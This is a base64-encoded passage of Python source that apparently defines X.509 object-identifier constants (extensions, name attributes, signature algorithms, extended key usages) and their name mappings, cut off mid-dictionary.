ICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPE9iamVjdElkZW50aWZpZXIob2lkPXt9LCBuYW1lPXt9KT4iLmZvcm1hdChcclxuICAgICAgICAgICAgc2VsZi5kb3R0ZWRfc3RyaW5nLCBzZWxmLl9uYW1lXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBfX2hhc2hfXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGhhc2goc2VsZi5kb3R0ZWRfc3RyaW5nKVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIF9uYW1lKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gX09JRF9OQU1FUy5nZXQoc2VsZiwgIlVua25vd24gT0lEIilcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBkb3R0ZWRfc3RyaW5nKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gc2VsZi5fZG90dGVkX3N0cmluZ1xyXG5cclxuXHJcbmNsYXNzIEV4dGVuc2lvbk9JRDpcclxuICAgIFNVQkpFQ1RfRElSRUNUT1JZX0FUVFJJQlVURVMgPSBPYmplY3RJZGVudGlmaWVyKCIyLjUuMjkuOSIpXHJcbiAgICBTVUJKRUNUX0tFWV9JREVOVElGSUVSID0gT2JqZWN0SWRlbnRpZmllcigiMi41LjI5LjE0IilcclxuICAgIEtFWV9VU0FHRSA9IE9iamVjdElkZW50aWZpZXIoIjIuNS4yOS4xNSIpXHJcbiAgICBTVUJKRUNUX0FMVEVSTkFUSVZFX05BTUUgPSBPYmplY3RJZGVudGlmaWVyKCIyLjUuMjkuMTciKVxyXG4gICAgSVNTVUVSX0FMVEVSTkFUSVZFX05BTUUgPSBPYmplY3RJZGVudGlmaWVyKCIyLjUuMjkuMTgiKVxyXG4gICAgQkFTSUNfQ09OU1RSQUlOVFMgPSBPYmplY3RJZGVudGlmaWVyKCIyLjUuMjkuMTkiKVxyXG4gICAgTkFNRV9DT05TVFJBSU5UUyA9IE9iamVjdElkZW50aWZpZXIoIjIuNS4yOS4zMCIpXHJcbiAgICBDUkxfRElTVFJJQlVUSU9OX1BPSU5UUyA9IE9iamVjdElkZW50aWZpZXIoIjIuNS4yOS4zMSIpXHJcbiAgICBDRVJUSUZJQ0FURV9QT0xJQ0lFUyA9IE9iamVjdElkZW50aWZpZXIoIjIuNS4yOS4zMiIpXHJcbiAgICBQT0xJQ1lfTUFQUElOR1MgPSBPYmplY3RJZGVudGlmaWVyKCIyLjUuMjkuMzMiKVxyXG4gICAgQVVUSE9SSVRZX0tFWV9JREVOVElGSUVSID0gT2JqZWN0SWRlbnRpZmllcigiMi41LjI5LjM1IilcclxuICAgIFBPTElDWV9DT05TVFJBSU5UUyA9IE9iamVjdElkZW50aWZpZXIoIjIuNS4yOS4zNiIpXHJcbiAgICBFWFRFTkRFRF9LRVlfVVNBR0UgPSBPYmplY3RJZGVudGlmaWVyKCIyLjUuMjkuMzciKVxyXG4gICAgRlJFU0hFU1RfQ1JMID0gT2JqZWN0SWRlbnRpZmllcigiMi41LjI5LjQ2IilcclxuICAgIElOSElCSVRfQU5ZX1BPTElDWSA9IE9iamVjdElkZW50aWZpZXIoIjIuNS4yOS41NCIpXHJcbiAgICBJU1NVSU5HX0RJU1RSSUJVVElPTl9QT0lOVCA9IE9iamVjdElkZW50aWZpZXIoIjIuNS4yOS4yOCIpXHJcbiAgICBBVVRIT1JJVFlfSU5GT1JNQVRJT05fQUNDRVNTID0gT2JqZWN0SWRlbnRpZmllcigiMS4zLjYuMS41LjUuNy4xLjEiKVxyXG4gICAgU1VCSkVDVF9JTkZPUk1BVElPTl9BQ0NFU1MgPSBPYmplY3RJZGVudGlmaWVyKCIxLjMuNi4xLjUuNS43LjEuMTEiKVxyXG4gICAgT0NTUF9OT19DSEVDSyA9IE9iamVjdElkZW50aWZpZXIoIjEuMy42LjEuNS41LjcuNDguMS41IilcclxuICAgIFRMU19GRUFUVVJFID0gT2JqZWN0SWRlbnRpZmllcigiMS4zLjYuMS41LjUuNy4xLjI0IilcclxuICAgIENSTF9OVU1CRVIgPSBPYmplY3RJZGVudGlmaWVyKCIyLjUuMjkuMjAiKVxyXG4gICAgREVMVEFfQ1JMX0lORElDQVRPUiA9IE9iamVjdElkZW50aWZpZXIoIjIuNS4yOS4yNyIpXHJcbiAgICBQUkVDRVJUX1NJR05FRF9DRVJUSUZJQ0FURV9USU1FU1RBTVBTID0gT2JqZWN0SWRlbnRpZmllcihcclxuICAgICAgICAiMS4zLjYuMS40LjEuMTExMjkuMi40LjIiXHJcbiAgICApXHJcbiAgICBQUkVDRVJUX1BPSVNPTiA9IE9iamVjdElkZW50aWZpZXIoIjEuMy42LjEuNC4xLjExMTI5LjIuNC4zIilcclxuICAgIFNJR05FRF9DRVJUSUZJQ0FURV9USU1FU1RBTVBTID0gT2JqZWN0SWRlbnRpZmllcigiMS4zLjYuMS40LjEuMTExMjkuMi40LjUiKVxyXG5cclxuXHJcbmNsYXNzIE9DU1BFeHRlbnNpb25PSUQ6XHJcbiAgICBOT05DRSA9IE9iamVjdElkZW50aWZpZXIoIjEuMy42LjEuNS41LjcuNDguMS4yIilcclxuXHJcblxyXG5jbGFzcyBDUkxFbnRyeUV4dGVuc2lvbk9JRDpcclxuICAgIENFUlRJRklDQVRFX0lTU1VFUiA9IE9iamVjdElkZW50aWZpZXIoIjIuNS4yOS4yOSIpXHJcbiAgICBDUkxfUkVBU09OID0gT2JqZWN0SWRlbnRpZmllcigiMi41LjI5LjIxIilcclxuICAgIElOVkFMSURJVFlfREFURSA9IE9iamVjdElkZW50aWZpZXIoIjIuNS4yOS4yNCIpXHJcblxyXG5cclxuY2xhc3MgTmFtZU9JRDpcclxuICAgIENPTU1PTl9OQU1FID0gT2JqZWN0SWRlbnRpZmllcigiMi41LjQuMyIpXHJcbiAgICBDT1VOVFJZX05BTUUgPSBPYmplY3RJZGVudGlmaWVyKCIyLjUuNC42IilcclxuICAgIExPQ0FMSVRZX05BTUUgPSBPYmplY3RJZGVudGlmaWVyKCIyLjUuNC43IilcclxuICAgIFNUQVRFX09SX1BST1ZJTkNFX05BTUUgPSBPYmplY3RJZGVudGlmaWVyKCIyLjUuNC44IilcclxuICAgIFNUUkVFVF9BRERSRVNTID0gT2JqZWN0SWRlbnRpZmllcigiMi41LjQuOSIpXHJcbiAgICBPUkdBTklaQVRJT05fTkFNRSA9IE9iamVjdElkZW50aWZpZXIoIjIuNS40LjEwIilcclxuICAgIE9SR0FOSVpBVElPTkFMX1VOSVRfTkFNRSA9IE9iamVjdElkZW50aWZpZXIoIjIuNS40LjExIilcclxuICAgIFNFUklBTF9OVU1CRVIgPSBPYmplY3RJZGVudGlmaWVyKCIyLjUuNC41IilcclxuICAgIFNVUk5BTUUgPSBPYmplY3RJZGVudGlmaWVyKCIyLjUuNC40IilcclxuICAgIEdJVkVOX05BTUUgPSBPYmplY3RJZGVudGlmaWVyKCIyLjUuNC40MiIpXHJcbiAgICBUSVRMRSA9IE9iamVjdElkZW50aWZpZXIoIjIuNS40LjEyIilcclxuICAgIEdFTkVSQVRJT05fUVVBTElGSUVSID0gT2JqZWN0SWRlbnRpZmllcigiMi41LjQuNDQiKVxyXG4gICAgWDUwMF9VTklRVUVfSURFTlRJRklFUiA9IE9iamVjdElkZW50aWZpZXIoIjIuNS40LjQ1IilcclxuICAgIEROX1FVQUxJRklFUiA9IE9iamVjdElkZW50aWZpZXIoIjIuNS40LjQ2IilcclxuICAgIFBTRVVET05ZTSA9IE9iamVjdElkZW50aWZpZXIoIjIuNS40LjY1IilcclxuICAgIFVTRVJfSUQgPSBPYmplY3RJZGVudGlmaWVyKCIwLjkuMjM0Mi4xOTIwMDMwMC4xMDAuMS4xIilcclxuICAgIERPTUFJTl9DT01QT05FTlQgPSBPYmplY3RJZGVudGlmaWVyKCIwLjkuMjM0Mi4xOTIwMDMwMC4xMDAuMS4yNSIpXHJcbiAgICBFTUFJTF9BRERSRVNTID0gT2JqZWN0SWRlbnRpZmllcigiMS4yLjg0MC4xMTM1NDkuMS45LjEiKVxyXG4gICAgSlVSSVNESUNUSU9OX0NPVU5UUllfTkFNRSA9IE9iamVjdElkZW50aWZpZXIoIjEuMy42LjEuNC4xLjMxMS42MC4yLjEuMyIpXHJcbiAgICBKVVJJU0RJQ1RJT05fTE9DQUxJVFlfTkFNRSA9IE9iamVjdElkZW50aWZpZXIoIjEuMy42LjEuNC4xLjMxMS42MC4yLjEuMSIpXHJcbiAgICBKVVJJU0RJQ1RJT05fU1RBVEVfT1JfUFJPVklOQ0VfTkFNRSA9IE9iamVjdElkZW50aWZpZXIoXHJcbiAgICAgICAgIjEuMy42LjEuNC4xLjMxMS42MC4yLjEuMiJcclxuICAgIClcclxuICAgIEJVU0lORVNTX0NBVEVHT1JZID0gT2JqZWN0SWRlbnRpZmllcigiMi41LjQuMTUiKVxyXG4gICAgUE9TVEFMX0FERFJFU1MgPSBPYmplY3RJZGVudGlmaWVyKCIyLjUuNC4xNiIpXHJcbiAgICBQT1NUQUxfQ09ERSA9IE9iamVjdElkZW50aWZpZXIoIjIuNS40LjE3IilcclxuICAgIElOTiA9IE9iamVjdElkZW50aWZpZXIoIjEuMi42NDMuMy4xMzEuMS4xIilcclxuICAgIE9HUk4gPSBPYmplY3RJZGVudGlmaWVyKCIxLjIuNjQzLjEwMC4xIilcclxuICAgIFNOSUxTID0gT2JqZWN0SWRlbnRpZmllcigiMS4yLjY0My4xMDAuMyIpXHJcbiAgICBVTlNUUlVDVFVSRURfTkFNRSA9IE9iamVjdElkZW50aWZpZXIoIjEuMi44NDAuMTEzNTQ5LjEuOS4yIilcclxuXHJcblxyXG5jbGFzcyBTaWduYXR1cmVBbGdvcml0aG1PSUQ6XHJcbiAgICBSU0FfV0lUSF9NRDUgPSBPYmplY3RJZGVudGlmaWVyKCIxLjIuODQwLjExMzU0OS4xLjEuNCIpXHJcbiAgICBSU0FfV0lUSF9TSEExID0gT2JqZWN0SWRlbnRpZmllcigiMS4yLjg0MC4xMTM1NDkuMS4xLjUiKVxyXG4gICAgIyBUaGlzIGlzIGFuIGFsdGVybmF0ZSBPSUQgZm9yIFJTQSB3aXRoIFNIQTEgdGhhdCBpcyBvY2Nhc2lvbmFsbHkgc2VlblxyXG4gICAgX1JTQV9XSVRIX1NIQTEgPSBPYmplY3RJZGVudGlmaWVyKCIxLjMuMTQuMy4yLjI5IilcclxuICAgIFJTQV9XSVRIX1NIQTIyNCA9IE9iamVjdElkZW50aWZpZXIoIjEuMi44NDAuMTEzNTQ5LjEuMS4xNCIpXHJcbiAgICBSU0FfV0lUSF9TSEEyNTYgPSBPYmplY3RJZGVudGlmaWVyKCIxLjIuODQwLjExMzU0OS4xLjEuMTEiKVxyXG4gICAgUlNBX1dJVEhfU0hBMzg0ID0gT2JqZWN0SWRlbnRpZmllcigiMS4yLjg0MC4xMTM1NDkuMS4xLjEyIilcclxuICAgIFJTQV9XSVRIX1NIQTUxMiA9IE9iamVjdElkZW50aWZpZXIoIjEuMi44NDAuMTEzNTQ5LjEuMS4xMyIpXHJcbiAgICBSU0FfV0lUSF9TSEEzXzIyNCA9IE9iamVjdElkZW50aWZpZXIoIjIuMTYuODQwLjEuMTAxLjMuNC4zLjEzIilcclxuICAgIFJTQV9XSVRIX1NIQTNfMjU2ID0gT2JqZWN0SWRlbnRpZmllcigiMi4xNi44NDAuMS4xMDEuMy40LjMuMTQiKVxyXG4gICAgUlNBX1dJVEhfU0hBM18zODQgPSBPYmplY3RJZGVudGlmaWVyKCIyLjE2Ljg0MC4xLjEwMS4zLjQuMy4xNSIpXHJcbiAgICBSU0FfV0lUSF9TSEEzXzUxMiA9IE9iamVjdElkZW50aWZpZXIoIjIuMTYuODQwLjEuMTAxLjMuNC4zLjE2IilcclxuICAgIFJTQVNTQV9QU1MgPSBPYmplY3RJZGVudGlmaWVyKCIxLjIuODQwLjExMzU0OS4xLjEuMTAiKVxyXG4gICAgRUNEU0FfV0lUSF9TSEExID0gT2JqZWN0SWRlbnRpZmllcigiMS4yLjg0MC4xMDA0NS40LjEiKVxyXG4gICAgRUNEU0FfV0lUSF9TSEEyMjQgPSBPYmplY3RJZGVudGlmaWVyKCIxLjIuODQwLjEwMDQ1LjQuMy4xIilcclxuICAgIEVDRFNBX1dJVEhfU0hBMjU2ID0gT2JqZWN0SWRlbnRpZmllcigiMS4yLjg0MC4xMDA0NS40LjMuMiIpXHJcbiAgICBFQ0RTQV9XSVRIX1NIQTM4NCA9IE9iamVjdElkZW50aWZpZXIoIjEuMi44NDAuMTAwNDUuNC4zLjMiKVxyXG4gICAgRUNEU0FfV0lUSF9TSEE1MTIgPSBPYmplY3RJZGVudGlmaWVyKCIxLjIuODQwLjEwMDQ1LjQuMy40IilcclxuICAgIEVDRFNBX1dJVEhfU0hBM18yMjQgPSBPYmplY3RJZGVudGlmaWVyKCIyLjE2Ljg0MC4xLjEwMS4zLjQuMy45IilcclxuICAgIEVDRFNBX1dJVEhfU0hBM18yNTYgPSBPYmplY3RJZGVudGlmaWVyKCIyLjE2Ljg0MC4xLjEwMS4zLjQuMy4xMCIpXHJcbiAgICBFQ0RTQV9XSVRIX1NIQTNfMzg0ID0gT2JqZWN0SWRlbnRpZmllcigiMi4xNi44NDAuMS4xMDEuMy40LjMuMTEiKVxyXG4gICAgRUNEU0FfV0lUSF9TSEEzXzUxMiA9IE9iamVjdElkZW50aWZpZXIoIjIuMTYuODQwLjEuMTAxLjMuNC4zLjEyIilcclxuICAgIERTQV9XSVRIX1NIQTEgPSBPYmplY3RJZGVudGlmaWVyKCIxLjIuODQwLjEwMDQwLjQuMyIpXHJcbiAgICBEU0FfV0lUSF9TSEEyMjQgPSBPYmplY3RJZGVudGlmaWVyKCIyLjE2Ljg0MC4xLjEwMS4zLjQuMy4xIilcclxuICAgIERTQV9XSVRIX1NIQTI1NiA9IE9iamVjdElkZW50aWZpZXIoIjIuMTYuODQwLjEuMTAxLjMuNC4zLjIiKVxyXG4gICAgRFNBX1dJVEhfU0hBMzg0ID0gT2JqZWN0SWRlbnRpZmllcigiMi4xNi44NDAuMS4xMDEuMy40LjMuMyIpXHJcbiAgICBEU0FfV0lUSF9TSEE1MTIgPSBPYmplY3RJZGVudGlmaWVyKCIyLjE2Ljg0MC4xLjEwMS4zLjQuMy40IilcclxuICAgIEVEMjU1MTkgPSBPYmplY3RJZGVudGlmaWVyKCIxLjMuMTAxLjExMiIpXHJcbiAgICBFRDQ0OCA9IE9iamVjdElkZW50aWZpZXIoIjEuMy4xMDEuMTEzIilcclxuICAgIEdPU1RSMzQxMV85NF9XSVRIXzM0MTBfMjAwMSA9IE9iamVjdElkZW50aWZpZXIoIjEuMi42NDMuMi4yLjMiKVxyXG4gICAgR09TVFIzNDEwXzIwMTJfV0lUSF8zNDExXzIwMTJfMjU2ID0gT2JqZWN0SWRlbnRpZmllcigiMS4yLjY0My43LjEuMS4zLjIiKVxyXG4gICAgR09TVFIzNDEwXzIwMTJfV0lUSF8zNDExXzIwMTJfNTEyID0gT2JqZWN0SWRlbnRpZmllcigiMS4yLjY0My43LjEuMS4zLjMiKVxyXG5cclxuXHJcbl9TSUdfT0lEU19UT19IQVNIOiB0eXBpbmcuRGljdFtcclxuICAgIE9iamVjdElkZW50aWZpZXIsIHR5cGluZy5PcHRpb25hbFtoYXNoZXMuSGFzaEFsZ29yaXRobV1cclxuXSA9IHtcclxuICAgIFNpZ25hdHVyZUFsZ29yaXRobU9JRC5SU0FfV0lUSF9NRDU6IGhhc2hlcy5NRDUoKSxcclxuICAgIFNpZ25hdHVyZUFsZ29yaXRobU9JRC5SU0FfV0lUSF9TSEExOiBoYXNoZXMuU0hBMSgpLFxyXG4gICAgU2lnbmF0dXJlQWxnb3JpdGhtT0lELl9SU0FfV0lUSF9TSEExOiBoYXNoZXMuU0hBMSgpLFxyXG4gICAgU2lnbmF0dXJlQWxnb3JpdGhtT0lELlJTQV9XSVRIX1NIQTIyNDogaGFzaGVzLlNIQTIyNCgpLFxyXG4gICAgU2lnbmF0dXJlQWxnb3JpdGhtT0lELlJTQV9XSVRIX1NIQTI1NjogaGFzaGVzLlNIQTI1NigpLFxyXG4gICAgU2lnbmF0dXJlQWxnb3JpdGhtT0lELlJTQV9XSVRIX1NIQTM4NDogaGFzaGVzLlNIQTM4NCgpLFxyXG4gICAgU2lnbmF0dXJlQWxnb3JpdGhtT0lELlJTQV9XSVRIX1NIQTUxMjogaGFzaGVzLlNIQTUxMigpLFxyXG4gICAgU2lnbmF0dXJlQWxnb3JpdGhtT0lELkVDRFNBX1dJVEhfU0hBMTogaGFzaGVzLlNIQTEoKSxcclxuICAgIFNpZ25hdHVyZUFsZ29yaXRobU9JRC5FQ0RTQV9XSVRIX1NIQTIyNDogaGFzaGVzLlNIQTIyNCgpLFxyXG4gICAgU2lnbmF0dXJlQWxnb3JpdGhtT0lELkVDRFNBX1dJVEhfU0hBMjU2OiBoYXNoZXMuU0hBMjU2KCksXHJcbiAgICBTaWduYXR1cmVBbGdvcml0aG1PSUQuRUNEU0FfV0lUSF9TSEEzODQ6IGhhc2hlcy5TSEEzODQoKSxcclxuICAgIFNpZ25hdHVyZUFsZ29yaXRobU9JRC5FQ0RTQV9XSVRIX1NIQTUxMjogaGFzaGVzLlNIQTUxMigpLFxyXG4gICAgU2lnbmF0dXJlQWxnb3JpdGhtT0lELkRTQV9XSVRIX1NIQTE6IGhhc2hlcy5TSEExKCksXHJcbiAgICBTaWduYXR1cmVBbGdvcml0aG1PSUQuRFNBX1dJVEhfU0hBMjI0OiBoYXNoZXMuU0hBMjI0KCksXHJcbiAgICBTaWduYXR1cmVBbGdvcml0aG1PSUQuRFNBX1dJVEhfU0hBMjU2OiBoYXNoZXMuU0hBMjU2KCksXHJcbiAgICBTaWduYXR1cmVBbGdvcml0aG1PSUQuRUQyNTUxOTogTm9uZSxcclxuICAgIFNpZ25hdHVyZUFsZ29yaXRobU9JRC5FRDQ0ODogTm9uZSxcclxuICAgIFNpZ25hdHVyZUFsZ29yaXRobU9JRC5HT1NUUjM0MTFfOTRfV0lUSF8zNDEwXzIwMDE6IE5vbmUsXHJcbiAgICBTaWduYXR1cmVBbGdvcml0aG1PSUQuR09TVFIzNDEwXzIwMTJfV0lUSF8zNDExXzIwMTJfMjU2OiBOb25lLFxyXG4gICAgU2lnbmF0dXJlQWxnb3JpdGhtT0lELkdPU1RSMzQxMF8yMDEyX1dJVEhfMzQxMV8yMDEyXzUxMjogTm9uZSxcclxufVxyXG5cclxuXHJcbmNsYXNzIEV4dGVuZGVkS2V5VXNhZ2VPSUQ6XHJcbiAgICBTRVJWRVJfQVVUSCA9IE9iamVjdElkZW50aWZpZXIoIjEuMy42LjEuNS41LjcuMy4xIilcclxuICAgIENMSUVOVF9BVVRIID0gT2JqZWN0SWRlbnRpZmllcigiMS4zLjYuMS41LjUuNy4zLjIiKVxyXG4gICAgQ09ERV9TSUdOSU5HID0gT2JqZWN0SWRlbnRpZmllcigiMS4zLjYuMS41LjUuNy4zLjMiKVxyXG4gICAgRU1BSUxfUFJPVEVDVElPTiA9IE9iamVjdElkZW50aWZpZXIoIjEuMy42LjEuNS41LjcuMy40IilcclxuICAgIFRJTUVfU1RBTVBJTkcgPSBPYmplY3RJZGVudGlmaWVyKCIxLjMuNi4xLjUuNS43LjMuOCIpXHJcbiAgICBPQ1NQX1NJR05JTkcgPSBPYmplY3RJZGVudGlmaWVyKCIxLjMuNi4xLjUuNS43LjMuOSIpXHJcbiAgICBBTllfRVhURU5ERURfS0VZX1VTQUdFID0gT2JqZWN0SWRlbnRpZmllcigiMi41LjI5LjM3LjAiKVxyXG4gICAgU01BUlRDQVJEX0xPR09OID0gT2JqZWN0SWRlbnRpZmllcigiMS4zLjYuMS40LjEuMzExLjIwLjIuMiIpXHJcbiAgICBLRVJCRVJPU19QS0lOSVRfS0RDID0gT2JqZWN0SWRlbnRpZmllcigiMS4zLjYuMS41LjIuMy41IilcclxuICAgIElQU0VDX0lLRSA9IE9iamVjdElkZW50aWZpZXIoIjEuMy42LjEuNS41LjcuMy4xNyIpXHJcblxyXG5cclxuY2xhc3MgQXV0aG9yaXR5SW5mb3JtYXRpb25BY2Nlc3NPSUQ6XHJcbiAgICBDQV9JU1NVRVJTID0gT2JqZWN0SWRlbnRpZmllcigiMS4zLjYuMS41LjUuNy40OC4yIilcclxuICAgIE9DU1AgPSBPYmplY3RJZGVudGlmaWVyKCIxLjMuNi4xLjUuNS43LjQ4LjEiKVxyXG5cclxuXHJcbmNsYXNzIFN1YmplY3RJbmZvcm1hdGlvbkFjY2Vzc09JRDpcclxuICAgIENBX1JFUE9TSVRPUlkgPSBPYmplY3RJZGVudGlmaWVyKCIxLjMuNi4xLjUuNS43LjQ4LjUiKVxyXG5cclxuXHJcbmNsYXNzIENlcnRpZmljYXRlUG9saWNpZXNPSUQ6XHJcbiAgICBDUFNfUVVBTElGSUVSID0gT2JqZWN0SWRlbnRpZmllcigiMS4zLjYuMS41LjUuNy4yLjEiKVxyXG4gICAgQ1BTX1VTRVJfTk9USUNFID0gT2JqZWN0SWRlbnRpZmllcigiMS4zLjYuMS41LjUuNy4yLjIiKVxyXG4gICAgQU5ZX1BPTElDWSA9IE9iamVjdElkZW50aWZpZXIoIjIuNS4yOS4zMi4wIilcclxuXHJcblxyXG5jbGFzcyBBdHRyaWJ1dGVPSUQ6XHJcbiAgICBDSEFMTEVOR0VfUEFTU1dPUkQgPSBPYmplY3RJZGVudGlmaWVyKCIxLjIuODQwLjExMzU0OS4xLjkuNyIpXHJcbiAgICBVTlNUUlVDVFVSRURfTkFNRSA9IE9iamVjdElkZW50aWZpZXIoIjEuMi44NDAuMTEzNTQ5LjEuOS4yIilcclxuXHJcblxyXG5fT0lEX05BTUVTID0ge1xyXG4gICAgTmFtZU9JRC5DT01NT05fTkFNRTogImNvbW1vbk5hbWUiLFxyXG4gICAgTmFtZU9JRC5DT1VOVFJZX05BTUU6ICJjb3VudHJ5TmFtZSIsXHJcbiAgICBOYW1lT0lELkxPQ0FMSVRZX05BTUU6ICJsb2NhbGl0eU5hbWUiLFxyXG4gICAgTmFtZU9JRC5TVEFURV9PUl9QUk9WSU5DRV9OQU1FOiAic3RhdGVPclByb3ZpbmNlTmFtZSIsXHJcbiAgICBOYW1lT0lELlNUUkVFVF9BRERSRVNTOiAic3RyZWV0QWRkcmVzcyIsXHJcbiAgICBOYW1lT0lELk9SR0FOSVpBVElPTl9OQU1FOiAib3JnYW5pemF0aW9uTmFtZSIsXHJcbiAgICBOYW1lT0lELk9SR0FOSVpBVElPTkFMX1VOSVRfTkFNRTogIm9yZ2FuaXphdGlvbmFsVW5pdE5hbWUiLFxyXG4gICAgTmFtZU9JRC5TRVJJQUxfTlVNQkVSOiAic2VyaWFsTnVtYmVyIixcclxuICAgIE5hbWVPSUQuU1VSTkFNRTogInN1cm5hbWUiLFxyXG4gICAgTmFtZU9JRC5HSVZFTl9OQU1FOiAiZ2l2ZW5OYW1lIixcclxuICAgIE5hbWVPSUQuVElUTEU6ICJ0aXRsZSIsXHJcbiAgICBOYW1lT0lELkdFTkVSQVRJT05fUVVBTElGSUVSOiAiZ2VuZXJhdGlvblF1YWxpZmllciIsXHJcbiAgICBOYW1lT0lELlg1MDBfVU5JUVVFX0lERU5USUZJRVI6ICJ4NTAwVW5pcXVlSWRlbnRpZmllciIsXHJcbiAgICBOYW1lT0lELkROX1FVQUxJRklFUjogImRuUXVhbGlmaWVyIixcclxuICAgIE5hbWVPSUQuUFNFVURPTllNOiAicHNldWRvbnltIixcclxuICAgIE5hbWVPSUQuVVNFUl9JRDogInVzZXJJRCIsXHJcbiAgICBOYW1lT0lELkRPTUFJTl9DT01QT05FTlQ6ICJkb21haW5Db21wb25lbnQiLFxyXG4gICAgTmFtZU9JRC5FTUFJTF9BRERSRVNTOiAiZW1haWxBZGRyZXNzIixcclxuICAgIE5hbWVPSUQuSlVSSVNESUNUSU9OX0NPVU5UUllfTkFNRTogImp1cmlzZGljdGlvbkNvdW50cnlOYW1lIixcclxuICAgIE5hbWVPSUQuSlVSSVNESUNUSU9OX0xPQ0FMSVRZX05BTUU6ICJqdXJpc2RpY3Rpb25Mb2NhbGl0eU5hbWUiLFxyXG4gICAgTmFtZU9JRC5KVVJJU0RJQ1RJT05fU1RBVEVfT1JfUFJPVklOQ0VfTkFNRTogKFxyXG4gICAgICAgICJqdXJpc2RpY3Rpb25TdGF0ZU9yUHJvdmluY2VOYW1lIlxyXG4gICAgKSxcclxuICAgIE5hbWVPSUQuQlVTSU5FU1NfQ0FURUdPUlk6ICJidXNpbmVzc0NhdGVnb3J5IixcclxuICAgIE5hbWVPSUQuUE9TVEFMX0FERFJFU1M6ICJwb3N0YWxBZGRyZXNzIixcclxuICAgIE5hbWVPSUQuUE9TVEFMX0NPREU6ICJwb3N0YWxDb2RlIixcclxuICAgIE5hbWVPSUQuSU5OOiAiSU5OIixcclxuICAgIE5hbWVPSUQuT0dSTjogIk9HUk4iLFxyXG4gICAgTmFtZU9JRC5TTklMUzogIlNOSUxTIixcclxuICAgIE5hbWVPSUQuVU5TVFJVQ1RVUkVEX05BTUU6ICJ1bnN0cnVjdHVyZWROYW1lIixcclxuICAgIFNpZ25hdHVyZUFsZ29yaXRobU9JRC5SU0FfV0lUSF9NRDU6ICJtZDVXaXRoUlNBRW5jcnlwdGlvbiIsXHJcbiAgICBTaWduYXR1cmVBbGdvcml0aG1PSUQuUlNBX1dJVEhfU0hBMTogInNoYTFXaXRoUlNBRW5jcnlwdGlvbiIsXHJcbiAgICBTaWduYXR1cmVBbGdvcml0aG1PSUQuUlNBX1dJVEhfU0hBMjI0OiAic2hhMjI0V2l0aFJTQUVuY3J5cHRpb24iLFxyXG4gICAgU2lnbmF0dXJlQWxnb3JpdGhtT0lELlJTQV9XSVRIX1NIQTI1NjogInNoYTI1NldpdGhSU0FFbmNyeXB0aW9uIixcclxuICAgIFNpZ25hdHVyZUFsZ29yaXRobU9JRC5SU0FfV0lUSF9TSEEzODQ6ICJzaGEzODRXaXRoUlNBRW5jcnlwdGlvbiIsXHJcbiAgICBTaWduYXR1cmVBbGdvcml0aG1PSUQuUlNBX1dJVEhfU0hBNTEyOiAic2hhNTEyV2l0aFJTQUVuY3J5cHRpb24iLFxyXG4gICAgU2lnbmF0dXJlQWxnb3JpdGhtT0lELlJTQVNTQV9QU1M6ICJSU0FTU0EtUFNTIixcclxuICAgIFNpZ25hdHVyZUFsZ29yaXRobU9JRC5FQ0RTQV9XSVRIX1NIQTE6ICJlY2RzYS13aXRoLVNIQTEiLFxyXG4gICAgU2lnbmF0dXJlQWxnb3JpdGhtT0lELkVDRFNBX1dJVEhfU0hBMjI0OiAiZWNkc2Etd2l0aC1TSEEyMjQiLFxyXG4gICAgU2lnbmF0dXJlQWxnb3JpdGhtT0lELkVDRFNBX1dJVEhfU0hBMjU2OiAiZWNkc2Etd2l0aC1TSEEyNTYiLFxyXG4gICAgU2lnbmF0dXJlQWxnb3JpdGhtT0lELkVDRFNBX1dJVEhfU0hBMzg0OiAiZWNkc2Etd2l0aC1TSEEzODQiLFxyXG4gICAgU2lnbmF0dXJlQWxnb3JpdGhtT0lELkVDRFNBX1dJVEhfU0hBNTEyOiAiZWNkc2Etd2l0aC1TSEE1MTIiLFxyXG4gICAgU2lnbmF0dXJlQWxnb3JpdGhtT0lELkRTQV9XSVRIX1NIQTE6ICJkc2Etd2l0aC1zaGExIixcclxuICAgIFNpZ25hdHVyZUFsZ29yaXRobU9JRC5EU0FfV0lUSF9TSEEyMjQ6ICJkc2Etd2l0aC1zaGEyMjQiLFxyXG4gICAgU2lnbmF0dXJlQWxnb3JpdGhtT0lELkRTQV9XSVRIX1NIQTI1NjogImRzYS13aXRoLXNoYTI1NiIsXHJcbiAgICBTaWduYXR1cmVBbGdvcml0aG1PSUQuRUQyNTUxOTogImVkMjU1MTkiLFxyXG4gICAgU2lnbmF0dXJlQWxnb3JpdGhtT0lELkVENDQ4OiAiZWQ0NDgiLFxyXG4gICAgU2lnbmF0dXJlQWxnb3JpdGhtT0lELkdPU1RSMzQxMV85NF9XSVRIXzM0MTBfMjAwMTogKFxyXG4gICAgICAgICJHT1NUIFIgMzQuMTEtOTQgd2l0aCBHT1NUIFIgMzQuMTAtMjAwMSJcclxuICAgICksXHJcbiAgICBTaWduYXR1cmVBbGdvcml0aG1PSUQuR09TVFIzNDEwXzIwMTJfV0lUSF8zNDExXzIwMTJfMjU2OiAoXHJcbiAgICAgICAgIkdPU1QgUiAzNC4xMC0yMDEyIHdpdGggR09TVCBSIDM0LjExLTIwMTIgKDI1NiBiaXQpIlxyXG4gICAgKSxcclxuICAgIFNpZ25hdHVyZUFsZ29yaXRobU9JRC5HT1NUUjM0MTBfMjAxMl9XSVRIXzM0MTFfMjAxMl81MTI6IChcclxuICAgICAgICAiR09TVCBSIDM0LjEwLTIwMTIgd2l0aCBHT1NUIFIgMzQuMTEtMjAxMiAoNTEyIGJpdCkiXHJcbiAgICApLFxyXG4gICAgRXh0ZW5kZWRLZXlVc2FnZU9JRC5TRVJWRVJfQVVUSDogInNlcnZlckF1dGgiLFxyXG4gICAgRXh0ZW5kZWRLZXlVc2FnZU9JRC5DTElFTlRfQVVUSDogImNsaWVudEF1dGgiLFxyXG4gICAgRXh0ZW5kZWRLZXlVc2FnZU9JRC5DT0RFX1NJR05JTkc6ICJjb2RlU2lnbmluZyIsXHJcbiAgICBFeHRlbmRlZEtleVVzYWdlT0lELkVNQUlMX1BST1RFQ1RJT046ICJlbWFpbFByb3RlY3R